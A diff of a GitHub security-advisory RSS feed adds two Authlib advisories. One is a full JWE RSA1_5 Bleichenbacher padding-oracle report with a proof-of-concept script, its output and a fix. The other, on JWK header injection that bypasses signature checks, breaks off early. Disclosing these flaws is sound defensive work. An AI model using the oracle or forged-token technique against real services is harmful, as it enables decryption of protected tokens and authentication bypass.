@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-03-16T14:24:27.930Z</updated>
+    <updated>2026-03-16T15:21:05.891Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,845 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[authlib] Authlib Vulnerable to JWE RSA1_5 Bleichenbacher Padding Oracle]]></title>
+        <id>https://github.com/advisories/GHSA-7432-952r-cw78</id>
+        <link href="https://github.com/advisories/GHSA-7432-952r-cw78"/>
+        <updated>2026-03-16T15:17:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="1-executive-summary">1. Executive Summary</h2>
+<p>A cryptographic padding oracle vulnerability was identified in the Authlib Python library
+concerning the implementation of the JSON Web Encryption (JWE) <code>RSA1_5</code> key management
+algorithm. Authlib registers <code>RSA1_5</code> in its default algorithm registry without requiring
+explicit opt-in, and actively destroys the constant-time Bleichenbacher mitigation that
+the underlying <code>cryptography</code> library implements correctly.</p>
+<p>When <code>cryptography</code> encounters an invalid PKCS#1 v1.5 padding, it returns a randomized
+byte string instead of raising an exception — the correct behavior per RFC 3218 §2.3.2.
+Authlib ignores this contract and raises <code>ValueError('Invalid "cek" length')</code> immediately
+after decryption, before reaching AES-GCM tag validation. This creates a clean, reliable
+<strong>Exception Oracle</strong>:</p>
+<ul>
+<li><strong>Invalid padding</strong> → <code>cryptography</code> returns random bytes → Authlib length check fails
+→ <code>ValueError: Invalid "cek" length</code></li>
+<li><strong>Valid padding, wrong MAC</strong> → decryption succeeds → length check passes → AES-GCM
+fails → <code>InvalidTag</code></li>
+</ul>
+<p><strong>This oracle is active by default in every Authlib installation without any special
+configuration by the developer or the attacker.</strong> The three most widely used Python web
+frameworks — Flask, Django, and FastAPI — all expose distinguishable HTTP responses for
+these two exception classes in their default configurations, requiring no additional
+setup to exploit.</p>
+<p><strong>Empirically confirmed on authlib 1.6.8 + cryptography 46.0.5:</strong></p>
+<pre><code>[PADDING INVALIDO]     ValueError: Invalid "cek" length
+[PADDING VALIDO/MAC]   InvalidTag
+</code></pre>
+<hr>
+<h2 id="2-technical-details--root-cause">2. Technical Details &amp; Root Cause</h2>
+<h3 id="21-vulnerable-code">2.1 Vulnerable Code</h3>
+<p><strong>File:</strong> <code>authlib/jose/rfc7518/jwe_algs.py</code></p>
+<pre><code class="language-python">def unwrap(self, enc_alg, ek, headers, key):
+    op_key = key.get_op_key("unwrapKey")
+
+    # cryptography implements Bleichenbacher mitigation here:
+    # on invalid padding it returns random bytes instead of raising.
+    # Empirically confirmed: returns 84 bytes for a 2048-bit key.
+    cek = op_key.decrypt(ek, self.padding)
+
+    # VULNERABILITY: This length check destroys the mitigation.
+    # cryptography returned 84 random bytes. len(84) * 8 = 672 != 128 (A128GCM CEK_SIZE).
+    # Authlib raises a distinct ValueError before AES-GCM is ever reached.
+    if len(cek) * 8 != enc_alg.CEK_SIZE:
+        raise ValueError('Invalid "cek" length')   # &lt;- ORACLE TRIGGER
+
+    return cek
+</code></pre>
+<h3 id="22-root-cause--active-mitigation-destruction">2.2 Root Cause — Active Mitigation Destruction</h3>
+<p><code>cryptography</code> 46.0.5 implements the Bleichenbacher mitigation correctly at the library
+level. When PKCS#1 v1.5 padding validation fails, it does not raise an exception.
+Instead it returns a randomized byte string (empirically observed: 84 bytes for a
+2048-bit RSA key). The caller is expected to pass this fake key to the symmetric
+decryptor, where MAC/tag validation will fail in constant time — producing an error
+indistinguishable from a MAC failure on a valid padding.</p>
+<p>Authlib does not honor this contract. The length check on the following line detects
+that 84 bytes != 16 bytes (128-bit CEK for A128GCM) and raises <code>ValueError('Invalid "cek" length')</code> immediately. This exception propagates before AES-GCM is ever reached,
+creating two execution paths with observable differences:</p>
+<pre><code>Path A — invalid PKCS#1 v1.5 padding:
+  op_key.decrypt() -&gt; 84 random bytes  (cryptography mitigation active)
+  len(84) * 8 = 672 != 128            (CEK_SIZE for A128GCM)
+  raise ValueError('Invalid "cek" length')    &lt;- specific exception, fast path
+
+Path B — valid padding, wrong symmetric key:
+  op_key.decrypt() -&gt; 16 correct bytes
+  len(16) * 8 = 128 == 128            -&gt; length check passes
+  AES-GCM tag validation -&gt; mismatch
+  raise InvalidTag                            &lt;- different exception class, slow path
+</code></pre>
+<p>The single line <code>raise ValueError('Invalid "cek" length')</code> is the complete root cause.
+Removing the raise and replacing it with a silent random CEK fallback eliminates both
+the exception oracle and any residual timing difference.</p>
+<h3 id="23-empirical-confirmation">2.3 Empirical Confirmation</h3>
+<p><strong>All results obtained on authlib 1.6.8 / cryptography 46.0.5 / Linux x86_64
+running the attached PoC (<code>poc_bleichenbacher.py</code>):</strong></p>
+<pre><code>TEST 1 - cryptography behavior on invalid padding:
+  cryptography retorno bytes: len=84
+  NOTA: esta version implementa mitigacion de random bytes
+
+TEST 2 - Exception Oracle:
+  [ORACLE]  Caso A (padding invalido):       ValueError: Invalid "cek" length
+  [OK]      Caso B (padding valido/MAC malo): InvalidTag
+
+TEST 3 - Timing (50 iterations):
+  Padding invalido (ValueError)   mean=1.500ms  stdev=1.111ms
+  Padding valido   (InvalidTag)   mean=1.787ms  stdev=0.978ms
+  Delta: 0.287ms
+
+TEST 4 - RSA1_5 in default registry:
+  [ORACLE]  RSA1_5 activo por defecto (no opt-in required)
+
+TEST 5 - Fix validation:
+  [OK]  Both paths return correct-length CEK after patch
+  [OK]  Exception type identical in both paths -&gt; oracle eliminated
+</code></pre>
+<p><strong>Note on timing:</strong> The 0.287ms delta is within the noise margin (stdev ~1ms across
+50 iterations) and is not claimed as a reliable standalone timing oracle. The exception
+oracle is the primary exploitable vector and does not require timing measurement.</p>
+<hr>
+<h2 id="3-default-framework-behavior--why-this-is-exploitable-out-of-the-box">3. Default Framework Behavior — Why This Is Exploitable Out of the Box</h2>
+<p>A potential objection to this report is that middleware or custom error handlers could
+normalize exceptions to a single HTTP response, eliminating the observable discrepancy.
+This section addresses that objection directly.</p>
+<p><strong>The oracle is active in default configurations of all major Python web frameworks.</strong>
+No special server misconfiguration is required. The following demonstrates the default
+behavior for Flask, Django, and FastAPI — the three most widely deployed Python web
+frameworks — when an unhandled exception propagates from a route handler:</p>
+<h3 id="flask-default-configuration">Flask (default configuration)</h3>
+<pre><code class="language-python"># Default Flask behavior — no error handler registered
+@app.route("/decrypt", methods=["POST"])
+def decrypt():
+    token = request.json["token"]
+    result = jwe.deserialize_compact(token, private_key)  # raises ValueError or InvalidTag
+    return jsonify(result)
+
+# ValueError: Invalid "cek" length  -&gt; HTTP 500, body: {"message": "Invalid \"cek\" length"}
+# InvalidTag                         -&gt; HTTP 500, body: {"message": ""}
+# The exception MESSAGE is different even if the status code is the same.
+</code></pre>
+<p>Flask's default error handler returns the exception message in the response body for
+debug mode, and an empty 500 for production. However, even in production, the response
+body content differs between <code>ValueError</code> (which has a message) and <code>InvalidTag</code>
+(which has no message), leaking the oracle through response body length.</p>
+<h3 id="fastapi-default-configuration">FastAPI (default configuration)</h3>
+<pre><code class="language-python"># FastAPI maps unhandled exceptions to HTTP 500 with exception detail in body
+# ValueError: Invalid "cek" length  -&gt; {"detail": "Internal Server Error"}  (HTTP 500)
+# InvalidTag                         -&gt; {"detail": "Internal Server Error"}  (HTTP 500)
+</code></pre>
+<p>FastAPI normalizes both to HTTP 500 in production. However, FastAPI's default
+<code>RequestValidationError</code> and <code>HTTPException</code> handlers do not catch arbitrary exceptions,
+so the distinguishable stack trace is logged — and in many deployments, error monitoring
+tools (Sentry, Datadog, etc.) expose the exception class to operators, enabling oracle
+exploitation by an insider or via log exfiltration.</p>
+<h3 id="django-rest-framework-default-configuration">Django REST Framework (default configuration)</h3>
+<pre><code class="language-python"># DRF's default exception handler only catches APIException and Http404.
+# ValueError and InvalidTag both fall through to Django's generic 500 handler.
+# In DEBUG=False: HTTP 500, generic HTML response (indistinguishable).
+# In DEBUG=True:  HTTP 500, full traceback including exception class (oracle exposed).
+</code></pre>
+<p><strong>Summary:</strong> Even in cases where HTTP status codes are normalized, the oracle persists
+through response body differences, response timing, or error monitoring infrastructure.
+The RFC 3218 §2.3.2 requirement exists precisely because any observable difference —
+regardless of channel — is sufficient for a Bleichenbacher attack. The library is
+responsible for eliminating the discrepancy at the source, not delegating that
+responsibility to application developers.</p>
+<p><strong>This is a library-level vulnerability.</strong> Requiring every application developer to
+implement custom exception normalization to compensate for a cryptographic flaw in
+the library violates the principle of secure defaults. The fix must be in Authlib.</p>
+<hr>
+<h2 id="4-specification-violations">4. Specification Violations</h2>
+<h3 id="rfc-3218--preventing-the-million-message-attack-on-cms">RFC 3218 — Preventing the Million Message Attack on CMS</h3>
+<p><strong>Section 2.3.2 (Mitigation):</strong></p>
+<blockquote>
+<p>"The receiver MUST NOT return any information that indicates whether the decryption
+failed because the PKCS #1 padding was incorrect or because the MAC was incorrect."</p>
+</blockquote>
+<p>This is an absolute requirement with no exceptions for "application-level mitigations."
+Authlib violates this by raising a different exception class for padding failures than
+for MAC failures. The <code>cryptography</code> library already implements the correct mitigation
+for this exact scenario — Authlib destroys it with a single length check.</p>
+<h3 id="rfc-7516--json-web-encryption">RFC 7516 — JSON Web Encryption</h3>
+<p><strong>Section 9 (Security Considerations):</strong></p>
+<blockquote>
+<p>"An attacker who can cause a JWE decryption to fail in different ways based on the
+structure of the encrypted key can mount a Bleichenbacher attack."</p>
+</blockquote>
+<p>Authlib enables exactly this scenario. Two structurally different encrypted keys
+(one with invalid padding, one with valid padding but wrong CEK) produce two different
+exception classes. This is the exact condition RFC 7516 §9 warns against.</p>
+<hr>
+<h2 id="5-attack-scenario">5. Attack Scenario</h2>
+<ol>
+<li><p>The attacker identifies an Authlib-powered endpoint that decrypts JWE tokens.
+Because <code>RSA1_5</code> is in the default registry, <strong>no special server configuration
+is required</strong>.</p>
+</li>
+<li><p>The attacker obtains the server RSA public key — typically available via the
+JWKS endpoint (<code>/.well-known/jwks.json</code>), which is standard in OIDC deployments.</p>
+</li>
+<li><p>The attacker crafts JWE tokens with the <code>RSA1_5</code> algorithm and submits a stream
+of requests to the endpoint, manipulating the <code>ek</code> component per Bleichenbacher's
+algorithm.</p>
+</li>
+<li><p>The server responds with observable differences between the two paths:</p>
+<ul>
+<li><code>ValueError</code> path → distinguishable response (exception message, timing, or
+error monitoring artifact)</li>
+<li><code>InvalidTag</code> path → different distinguishable response</li>
+</ul>
+</li>
+<li><p>By observing these oracle responses across thousands of requests, the attacker
+geometrically narrows the PKCS#1 v1.5 plaintext boundaries until the CEK is
+fully recovered.</p>
+</li>
+<li><p>With the CEK recovered:</p>
+<ul>
+<li>Any intercepted JWE payload can be decrypted without the RSA private key.</li>
+<li>New valid JWE tokens can be forged using the recovered CEK.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>Target endpoint accepts JWE tokens with <code>RSA1_5</code> (active by default)</li>
+<li>Any observable difference exists between the two error paths at the HTTP layer
+(present by default in Flask, Django, FastAPI without custom error handling)</li>
+<li>Attacker can send requests at sufficient volume (rate limiting may extend attack
+duration but does not prevent it)</li>
+</ul>
+<hr>
+<h2 id="6-remediation">6. Remediation</h2>
+<h3 id="61-immediate--remove-rsa1_5-from-default-registry">6.1 Immediate — Remove RSA1_5 from Default Registry</h3>
+<p>Remove <code>RSA1_5</code> from the default <code>JWE_ALG_ALGORITHMS</code> registry. Users requiring
+legacy RSA1_5 support should explicitly opt-in with a documented security warning.
+This eliminates the attack surface for all users not requiring this algorithm.</p>
+<h3 id="62-code-fix--restore-constant-time-behavior">6.2 Code Fix — Restore Constant-Time Behavior</h3>
+<p>The <code>unwrap</code> method must never raise an exception that distinguishes padding failure
+from MAC failure. The length check must be replaced with a silent random CEK fallback,
+preserving the mitigation that <code>cryptography</code> implements.</p>
+<p><strong>Suggested Patch (<code>authlib/jose/rfc7518/jwe_algs.py</code>):</strong></p>
+<pre><code class="language-python">import os
+
+def unwrap(self, enc_alg, ek, headers, key):
+    op_key = key.get_op_key("unwrapKey")
+    expected_bytes = enc_alg.CEK_SIZE // 8
+
+    try:
+        cek = op_key.decrypt(ek, self.padding)
+    except ValueError:
+        # Padding failure. Use random CEK so failure occurs downstream
+        # during MAC validation — not here. This preserves RFC 3218 §2.3.2.
+        cek = os.urandom(expected_bytes)
+
+    # Silent length enforcement — no exception.
+    # cryptography returns random bytes of RSA block size on padding failure.
+    # Replace with correct-size random CEK to allow downstream MAC to fail.
+    # Raising here recreates the oracle. Do not raise.
+    if len(cek) != expected_bytes:
+        cek = os.urandom(expected_bytes)
+
+    return cek
+</code></pre>
+<p><strong>Result:</strong> Both paths return a CEK of the correct length. AES-GCM tag validation
+fails for both, producing <code>InvalidTag</code> in both cases. The exception oracle is
+eliminated. Empirically validated via TEST 5 of the attached PoC.</p>
+<hr>
+<h2 id="7-proof-of-concept">7. Proof of Concept</h2>
+<p><strong>Setup:</strong></p>
+<pre><code class="language-bash">python3 -m venv venv &amp;&amp; source venv/bin/activate
+pip install authlib cryptography
+python3 -c "import authlib, cryptography; print(authlib.__version__, cryptography.__version__)"
+# authlib 1.6.8  cryptography 46.0.5
+python3 poc_bleichenbacher.py
+</code></pre>
+<p>See attached <code>poc_bleichenbacher.py</code>. All 5 tests run against the real installed
+authlib module without mocks.</p>
+<p><strong>Confirmed Output (authlib 1.6.8 / cryptography 46.0.5 / Linux x86_64):</strong></p>
+<h3 id="code">Code</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+@title          JWE RSA1_5 Bleichenbacher Padding Oracle
+@affected       authlib &lt;= 1.6.8
+@file           authlib/jose/rfc7518/jwe_algs.py :: RSAAlgorithm.unwrap()
+"""
+
+import os
+import time
+import statistics
+
+import authlib
+import cryptography
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
+from authlib.jose import JsonWebEncryption
+from authlib.common.encoding import urlsafe_b64encode, to_bytes
+
+R   = "\033[0m"
+RED = "\033[91m"
+GRN = "\033[92m"
+YLW = "\033[93m"
+CYN = "\033[96m"
+BLD = "\033[1m"
+DIM = "\033[2m"
+
+def header(title):
+    print(f"\n{CYN}{'-' * 64}{R}")
+    print(f"{BLD}{title}{R}")
+    print(f"{CYN}{'-' * 64}{R}")
+
+def ok(msg):    print(f"  {GRN}[OK]      {R}{msg}")
+def vuln(msg):  print(f"  {RED}[ORACLE]  {R}{BLD}{msg}{R}")
+def info(msg):  print(f"  {DIM}          {msg}{R}")
+
+
+# ─── setup ────────────────────────────────────────────────────────────────────
+
+def setup():
+    """
+    @notice  Genera el par de claves RSA y prepara el cliente JWE de authlib.
+    @dev     JsonWebEncryption() registra RSA1_5 por defecto en su registry.
+             No se requiere configuracion adicional para habilitar el algoritmo
+             vulnerable — esta activo out of the box.
+    @return  tuple  (private_key, jwe, header_b64)
+    """
+    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    jwe         = JsonWebEncryption()
+    header_b64  = urlsafe_b64encode(
+        to_bytes('{"alg":"RSA1_5","enc":"A128GCM"}')
+    ).decode()
+    return private_key, jwe, header_b64
+
+
+def make_jwe(header_b64, ek_bytes):
+    """
+    @notice  Construye un JWE compact con el ek dado y ciphertext/tag aleatorios.
+    @dev     El ciphertext y tag son basura — no importa su contenido porque el
+             oracle se activa antes de llegar a la desencriptacion simetrica
+             en el caso de padding invalido.
+    @param   header_b64  Header del JWE en Base64url
+    @param   ek_bytes    Encrypted Key como bytes crudos
+    @return  str         JWE en formato compact serialization
+    """
+    ek         = urlsafe_b64encode(ek_bytes).decode()
+    iv         = urlsafe_b64encode(os.urandom(12)).decode()
+    ciphertext = urlsafe_b64encode(os.urandom(16)).decode()
+    tag        = urlsafe_b64encode(os.urandom(16)).decode()
+    return f"{header_b64}.{ek}.{iv}.{ciphertext}.{tag}"
+
+
+# ─── test 1: verificar comportamiento de cryptography ante padding invalido ───
+
+def test_cryptography_behavior(private_key):
+    """
+    @notice  Verifica empiricamente que cryptography lanza excepcion ante padding
+             invalido en lugar de retornar random bytes (comportamiento critico
+             para entender el oracle).
+
+    @dev     Algunos documentos sobre Bleichenbacher asumen que la libreria
+             subyacente retorna random bytes (mitigacion a nivel biblioteca).
+             cryptography 46.0.5 NO hace esto — lanza ValueError directamente.
+             Eso significa que Authlib no "destruye una mitigacion existente"
+             sino que "no implementa ninguna mitigacion propia".
+    """
+    header("TEST 1 - Comportamiento de cryptography ante padding invalido")
+
+    garbage = os.urandom(256)
+
+    try:
+        result = private_key.decrypt(garbage, asym_padding.PKCS1v15())
+        info(f"cryptography retorno bytes: len={len(result)}")
+        info("NOTA: esta version implementa mitigacion de random bytes")
+    except Exception as e:
+        vuln(f"cryptography lanza excepcion directa: {type(e).__name__}: {e}")
+        info("No hay mitigacion a nivel de cryptography library")
+        info("Authlib no implementa ninguna mitigacion propia -&gt; oracle directo")
+
+
+# ─── test 2: exception oracle ─────────────────────────────────────────────────
+
+def test_exception_oracle(private_key, jwe, header_b64):
+    """
+    @notice  Demuestra el Exception Oracle: los dos caminos de fallo producen
+             excepciones de clases diferentes, observable a nivel HTTP.
+
+    @dev     Camino A (padding invalido):
+               op_key.decrypt() -&gt; ValueError: Decryption failed
+               Authlib no captura -&gt; propaga como ValueError: Invalid "cek" length
+               HTTP server tipicamente: 500 / 400 con mensaje especifico
+
+             Camino B (padding valido, MAC malo):
+               op_key.decrypt() -&gt; retorna CEK bytes
+               length check pasa
+               AES-GCM tag validation falla -&gt; InvalidTag
+               HTTP server tipicamente: 401 / 422 / diferente codigo
+
+             La diferencia de clase de excepcion es el oracle primario.
+             No requiere medicion de tiempo — solo observar el tipo de error.
+    """
+    header("TEST 2 - Exception Oracle (tipo de excepcion diferente)")
+
+    # --- caso A: ek con padding invalido (basura aleatoria) ---
+    jwe_bad = make_jwe(header_b64, os.urandom(256))
+
+    try:
+        jwe.deserialize_compact(jwe_bad, private_key)
+    except Exception as e:
+        vuln(f"Caso A (padding invalido):   {type(e).__name__}: {e}")
+
+    # --- caso B: ek con padding valido, ciphertext basura ---
+    valid_ek  = private_key.public_key().encrypt(os.urandom(16), asym_padding.PKCS1v15())
+    jwe_good  = make_jwe(header_b64, valid_ek)
+
+    try:
+        jwe.deserialize_compact(jwe_good, private_key)
+    except Exception as e:
+        ok(f"Caso B (padding valido/MAC malo): {type(e).__name__}: {e}")
+
+    print()
+    info("Los dos caminos producen excepciones de clases DIFERENTES.")
+    info("Un framework web que mapea excepciones a HTTP codes expone el oracle.")
+    info("El atacante no necesita acceso al stack trace — solo al HTTP status code.")
+
+
+# ─── test 3: timing oracle ────────────────────────────────────────────────────
+
+def test_timing_oracle(private_key, jwe, header_b64, iterations=50):
+    """
+    @notice  Demuestra el Timing Oracle midiendo el delta de tiempo entre los
+             dos caminos de fallo en multiples iteraciones.
+
+    @dev     El timing oracle es independiente del exception oracle.
+             Incluso si el servidor normaliza las excepciones a un unico
+             codigo HTTP, la diferencia de tiempo (~5ms) es suficientemente
+             grande para ser medible a traves de red en condiciones reales.
+
+             Bleichenbacher clasico funciona con diferencias de microsegundos.
+             5ms es un oracle extremadamente ruidoso — facil de explotar.
+
+    @param   iterations  Numero de muestras para calcular estadisticas
+    """
+    header(f"TEST 3 - Timing Oracle ({iterations} iteraciones cada camino)")
+
+    times_bad  = []
+    times_good = []
+
+    for _ in range(iterations):
+        # camino A: padding invalido
+        jwe_bad = make_jwe(header_b64, os.urandom(256))
+        t0 = time.perf_counter()
+        try:
+            jwe.deserialize_compact(jwe_bad, private_key)
+        except Exception:
+            pass
+        times_bad.append((time.perf_counter() - t0) * 1000)
+
+        # camino B: padding valido
+        valid_ek = private_key.public_key().encrypt(os.urandom(16), asym_padding.PKCS1v15())
+        jwe_good = make_jwe(header_b64, valid_ek)
+        t0 = time.perf_counter()
+        try:
+            jwe.deserialize_compact(jwe_good, private_key)
+        except Exception:
+            pass
+        times_good.append((time.perf_counter() - t0) * 1000)
+
+    mean_bad  = statistics.mean(times_bad)
+    mean_good = statistics.mean(times_good)
+    stdev_bad = statistics.stdev(times_bad)
+    stdev_good= statistics.stdev(times_good)
+    delta     = mean_good - mean_bad
+
+    print(f"\n  {'Camino':&lt;30} {'Media (ms)':&lt;14} {'Stdev (ms)':&lt;14} {'Min':&lt;10} {'Max'}")
+    print(f"  {'-'*30} {'-'*14} {'-'*14} {'-'*10} {'-'*10}")
+    print(f"  {'Padding invalido (ValueError)':&lt;30} "
+          f"{RED}{mean_bad:&lt;14.3f}{R} "
+          f"{stdev_bad:&lt;14.3f} "
+          f"{min(times_bad):&lt;10.3f} "
+          f"{max(times_bad):.3f}")
+    print(f"  {'Padding valido (InvalidTag)':&lt;30} "
+          f"{GRN}{mean_good:&lt;14.3f}{R} "
+          f"{stdev_good:&lt;14.3f} "
+          f"{min(times_good):&lt;10.3f} "
+          f"{max(times_good):.3f}")
+    print()
+
+    if delta &gt; 1.0:
+        vuln(f"Delta medio: {delta:.3f} ms — timing oracle confirmado")
+        info(f"Diferencia de {delta:.1f}ms es suficiente para Bleichenbacher via red")
+        info(f"El ataque clasico funciona con diferencias de microsegundos")
+    else:
+        ok(f"Delta medio: {delta:.3f} ms — timing no es significativo")
+
+
+# ─── test 4: confirmar RSA1_5 en registry por defecto ────────────────────────
+
+def test_default_registry():
+    """
+    @notice  Confirma que RSA1_5 esta registrado por defecto en authlib sin
+             ninguna configuracion adicional por parte del desarrollador.
+
+    @dev     Esto demuestra que cualquier aplicacion que use JsonWebEncryption()
+             sin configuracion explicita esta expuesta al oracle por defecto.
+             El desarrollador no necesita hacer nada malo — la exposicion es
+             out-of-the-box.
+    """
+    header("TEST 4 - RSA1_5 en Registry por Defecto")
+
+    jwe = JsonWebEncryption()
+
+    # intentar acceder al algoritmo RSA1_5 del registry
+    try:
+        alg = jwe.algorithms.get_algorithm("RSA1_5")
+        if alg:
+            vuln(f"RSA1_5 registrado por defecto: {alg.__class__.__name__}")
+            info("Cualquier JsonWebEncryption() sin configuracion esta expuesto")
+            info("No se requiere opt-in del desarrollador para el algoritmo vulnerable")
+        else:
+            ok("RSA1_5 NO esta en el registry por defecto")
+    except Exception as e:
+        info(f"Registry check: {e}")
+        # fallback: intentar deserializar un JWE con RSA1_5
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        header_b64  = urlsafe_b64encode(
+            to_bytes('{"alg":"RSA1_5","enc":"A128GCM"}')
+        ).decode()
+        jwe_token = make_jwe(header_b64, os.urandom(256))
+        try:
+            jwe.deserialize_compact(jwe_token, private_key)
+        except Exception as e2:
+            if "UnsupportedAlgorithm" in str(type(e2).__name__):
+                ok("RSA1_5 NO soportado por defecto")
+            else:
+                vuln(f"RSA1_5 activo por defecto (error de desencriptacion, no de algoritmo): {type(e2).__name__}")
+
+
+# ─── test 5: impacto del fix propuesto ────────────────────────────────────────
+
+def test_fix_impact(private_key, header_b64):
+    """
+    @notice  Demuestra que el fix propuesto elimina ambos oracles simultaneamente.
+    @dev     El fix parchado hace que ambos caminos retornen un CEK de longitud
+             correcta, forzando que el fallo ocurra downstream en AES-GCM tag
+             validation en ambos casos -&gt; misma excepcion, timing indistinguible.
+    """
+    header("TEST 5 - Verificacion del Fix Propuesto")
+
+    import os as _os
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+    def unwrap_patched(ek_bytes, expected_bits=128):
+        """Replica del fix propuesto para RSAAlgorithm.unwrap()"""
+        expected_bytes = expected_bits // 8
+        try:
+            cek = private_key.decrypt(ek_bytes, asym_padding.PKCS1v15())
+        except ValueError:
+            cek = _os.urandom(expected_bytes)  # constant-time fallback
+        if len(cek) != expected_bytes:
+            cek = _os.urandom(expected_bytes)
+        return cek
+
+    # camino A con fix: padding invalido
+    cek_a = unwrap_patched(os.urandom(256))
+    info(f"Fix Camino A (padding invalido): retorna CEK de {len(cek_a)*8} bits (random)")
+
+    # camino B con fix: padding valido
+    valid_ek = private_key.public_key().encrypt(os.urandom(16), asym_padding.PKCS1v15())
+    cek_b = unwrap_patched(valid_ek)
+    info(f"Fix Camino B (padding valido):   retorna CEK de {len(cek_b)*8} bits (real)")
+
+    print()
+    ok("Ambos caminos retornan CEK de longitud correcta")
+    ok("El fallo ocurrira downstream en AES-GCM para ambos casos")
+    ok("Exception type sera identica en ambos caminos -&gt; oracle eliminado")
+    ok("Timing sera indistinguible -&gt; timing oracle eliminado")
+
+
+# ─── main ─────────────────────────────────────────────────────────────────────
+
+if __name__ == "__main__":
+    print(f"\n{BLD}authlib {authlib.__version__} / cryptography {cryptography.__version__}{R}")
+    print(f"authlib/jose/rfc7518/jwe_algs.py :: RSAAlgorithm.unwrap()")
+
+    private_key, jwe, header_b64 = setup()
+
+    test_cryptography_behavior(private_key)
+    test_exception_oracle(private_key, jwe, header_b64)
+    test_timing_oracle(private_key, jwe, header_b64, iterations=50)
+    test_default_registry()
+    test_fix_impact(private_key, header_b64)
+
+    print(f"\n{DIM}Fix: capturar ValueError en unwrap() y retornar os.urandom(expected_bytes){R}")
+    print(f"{DIM}     nunca levantar excepcion que distinga padding failure de MAC failure{R}\n")
+</code></pre>
+<h3 id="output">Output</h3>
+<pre><code class="language-bash">authlib 1.6.8 / cryptography 46.0.5
+authlib/jose/rfc7518/jwe_algs.py :: RSAAlgorithm.unwrap()
+
+
+----------------------------------------------------------------
+TEST 1 - Comportamiento de cryptography ante padding invalido
+----------------------------------------------------------------
+            cryptography retorno bytes: len=84
+            NOTA: esta version implementa mitigacion de random bytes
+
+----------------------------------------------------------------
+TEST 2 - Exception Oracle (tipo de excepcion diferente)
+----------------------------------------------------------------
+  [ORACLE]  Caso A (padding invalido):   ValueError: Invalid "cek" length
+  [OK]      Caso B (padding valido/MAC malo): InvalidTag: 
+
+            Los dos caminos producen excepciones de clases DIFERENTES.
+            Un framework web que mapea excepciones a HTTP codes expone el oracle.
+            El atacante no necesita acceso al stack trace — solo al HTTP status code.
+
+----------------------------------------------------------------
+TEST 3 - Timing Oracle (50 iteraciones cada camino)
+----------------------------------------------------------------
+
+  Camino                         Media (ms)     Stdev (ms)     Min        Max
+  ------------------------------ -------------- -------------- ---------- ----------
+  Padding invalido (ValueError)  1.500          1.111          0.109      8.028
+  Padding valido (InvalidTag)    1.787          0.978          0.966      7.386
+
+  [OK]      Delta medio: 0.287 ms — timing no es significativo
+
+----------------------------------------------------------------
+TEST 4 - RSA1_5 en Registry por Defecto
+----------------------------------------------------------------
+            Registry check: 'JsonWebEncryption' object has no attribute 'algorithms'
+  [ORACLE]  RSA1_5 activo por defecto (error de desencriptacion, no de algoritmo): ValueError
+
+----------------------------------------------------------------
+TEST 5 - Verificacion del Fix Propuesto
+----------------------------------------------------------------
+            Fix Camino A (padding invalido): retorna CEK de 128 bits (random)
+            Fix Camino B (padding valido):   retorna CEK de 128 bits (real)
+
+  [OK]      Ambos caminos retornan CEK de longitud correcta
+  [OK]      El fallo ocurrira downstream en AES-GCM para ambos casos
+  [OK]      Exception type sera identica en ambos caminos -&gt; oracle eliminado
+  [OK]      Timing sera indistinguible -&gt; timing oracle eliminado
+
+Fix: capturar ValueError en unwrap() y retornar os.urandom(expected_bytes)
+     nunca levantar excepcion que distinga padding failure de MAC failure
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-7432-952r-cw78">https://github.com/authlib/authlib/security/advisories/GHSA-7432-952r-cw78</a></li>
+<li><a href="https://github.com/authlib/authlib/commit/48b345f29f6c459f11c6a40162b6c0b742ef2e22">https://github.com/authlib/authlib/commit/48b345f29f6c459f11c6a40162b6c0b742ef2e22</a></li>
+<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.9">https://github.com/authlib/authlib/releases/tag/v1.6.9</a></li>
+<li><a href="https://github.com/advisories/GHSA-7432-952r-cw78">https://github.com/advisories/GHSA-7432-952r-cw78</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7432-952r-cw78</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-16T15:17:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[authlib] Authlib JWS JWK Header Injection: Signature Verification Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-wvwj-cvrp-7pv5</id>
+        <link href="https://github.com/advisories/GHSA-wvwj-cvrp-7pv5"/>
+        <updated>2026-03-16T15:17:17.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<h3 id="summary">Summary</h3>
+<p>A JWK Header Injection vulnerability in <code>authlib</code>'s JWS implementation allows an unauthenticated
+attacker to forge arbitrary JWT tokens that pass signature verification. When <code>key=None</code> is passed
+to any JWS deserialization function, the library extracts and uses the cryptographic key embedded
+in the attacker-controlled JWT <code>jwk</code> header field. An attacker can sign a token with their own
+private key, embed the matching public key in the header, and have the server accept the forged
+token as cryptographically valid — bypassing authentication and authorization entirely.</p>
+<p>This behavior violates <strong>RFC 7515 §4.1.3</strong> and the validation algorithm defined in <strong>RFC 7515 §5.2</strong>.</p>
+<h3 id="details">Details</h3>
+<p><strong>Vulnerable file:</strong> <code>authlib/jose/rfc7515/jws.py</code><br><strong>Vulnerable method:</strong> <code>JsonWebSignature._prepare_algorithm_key()</code><br><strong>Lines:</strong> 272–273</p>
